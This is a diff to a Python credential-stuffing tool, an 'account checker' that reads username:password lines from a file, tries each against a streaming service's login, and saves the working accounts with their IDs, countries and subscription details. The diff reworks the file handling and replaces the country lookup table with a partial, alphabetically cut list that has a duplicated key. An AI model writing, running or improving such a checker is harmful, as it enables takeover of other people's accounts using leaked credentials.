@@ -63,34 +63,36 @@ def check_crunchyroll_account(username, password):
     
     country_code = subscription_info["subscription_country"]
     country_dict = {
-        "US": "United States 🇺🇸",
-        "CA": "Canada 🇨🇦",
-        "GB": "United Kingdom 🇬🇧",
-        "AU": "Australia 🇦🇺",
-        "DE": "Germany 🇩🇪",
-        "FR": "France 🇫🇷",
-        "IT": "Italy 🇮🇹",
-        "ES": "Spain 🇪🇸",
-        "BR": "Brazil 🇧🇷",
-        "MX": "Mexico 🇲🇽",
-        "JP": "Japan 🇯🇵",
-        "KR": "South Korea 🇰🇷",
-        "CN": "China 🇨🇳",
-        "IN": "India 🇮🇳",
-        "RU": "Russia 🇷🇺",
-        "ZA": "South Africa 🇿🇦",
-        "NG": "Nigeria 🇳🇬",
-        "EG": "Egypt 🇪🇬",
+        "AF": "Afghanistan 🇦🇫",
+        "AT": "Austria 🇦🇹",
+        "AX": "Åland Islands 🇦🇽",
+        "AL": "Albania 🇦🇱",
+        "DZ": "Algeria 🇩🇿",
+        "AS": "American Samoa 🇦🇸",
+        "AD": "Andorra 🇦🇩",
+        "AO": "Angola 🇦🇴",
+        "AI": "Anguilla 🇦🇮",
+        "AG": "Antigua and Barbuda 🇦🇬",
         "AR": "Argentina 🇦🇷",
-        "CL": "Chile 🇨🇱",
-        "CO": "Colombia 🇨🇴",
-        "PE": "Peru 🇵🇪",
-        "NZ": "New Zealand 🇳🇿",
-        "SG": "Singapore 🇸🇬",
-        "TH": "Thailand 🇹🇭",
-        "MY": "Malaysia 🇲🇾",
-        "PH": "Philippines 🇵🇭",
-        "ID": "Indonesia 🇮🇩"
+        "AM": "Armenia 🇦🇲",
+        "AW": "Aruba 🇦🇼",
+        "AU": "Australia 🇦🇺",
+        "AT": "Austria 🇦🇹",
+        "AZ": "Azerbaijan 🇦🇿",
+        "BS": "Bahamas 🇧🇸",
+        "BH": "Bahrain 🇧🇭",
+        "BD": "Bangladesh 🇧🇩",
+        "BB": "Barbados 🇧🇧",
+        "BY": "Belarus 🇧🇾",
+        "BE": "Belgium 🇧🇪",
+        "BZ": "Belize 🇧🇿",
+        "BJ": "Benin 🇧🇯",
+        "BM": "Bermuda 🇧🇲",
+        "BT": "Bhutan 🇧🇹",
+        "BO": "Bolivia 🇧🇴",
+        "BA": "Bosnia and Herzegovina 🇧🇦",
+        "BW": "Botswana 🇧🇼",
+        "BR": "Brazil 🇧🇷",
     }
 
     country_name = country_dict.get(country_code, "Unknown Country")
@@ -102,30 +104,33 @@ def check_crunchyroll_account(username, password):
         "subscription_info": subscription_info
     }
 
-def process_accounts(file_path, output_path):
-    print(f"Processing file: {file_path}")
+def process_accounts(input_path, output_path):
+    print(f"Processing file: {input_path}")
     try:
-        with open(file_path, 'r', encoding='utf-8') as file:
-            accounts = file.readlines()
+        with open(input_path, 'r', encoding='utf-8') as infile:
+            accounts = infile.readlines()
         
-        with open(output_path, 'w', encoding='utf-8') as file:
+        with open(output_path, 'w', encoding='utf-8') as outfile:
             for line in accounts:
-                username, password = line.strip().split(':')
-                print(f"Checking account: {username}")
-                result = check_crunchyroll_account(username, password)
+                if ':' in line:
+                    username, password = line.strip().split(':', 1)
+                    print(f"Checking account: {username}")
+                    result = check_crunchyroll_account(username, password)
+                    
+                    if result["status"] == "success":
+                        valid_info = (f"{username}: Success - Account ID: {result['account_id']}, "
+                                      f"Country: {result['subscription_country']}, Info: {result['subscription_info']}")
+                        outfile.write(valid_info + "\n")
+                        print(f"Valid account found and saved: {valid_info}")
+                    else:
+                        outfile.write(f"{username}: {result['status']} - {result['message']}\n")
                 
-                if result["status"] == "success":
-                    print(f"Valid account found: {username}")
-                    file.write(f"{username}:{password}\n")
-                else:
-                    print(f"Account {username}: Status: {result['status']}, Message: {result['message']}")
-            
-            print(f"Valid accounts saved to {output_path}")
-
+        print(f"Processing complete. Results saved to {output_path}.")
+    
     except FileNotFoundError:
-        print("File not found. Please check the file path.")
-    except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"Error: The file at {input_path} was not found.")
+    except IOError as e:
+        print(f"Error reading or writing the file: {e}")
 
 if __name__ == "__main__":
     input_path = input("Enter the path to the accounts file (e.g., /storage/emulated/0/Download/crunchyroll.txt): ")
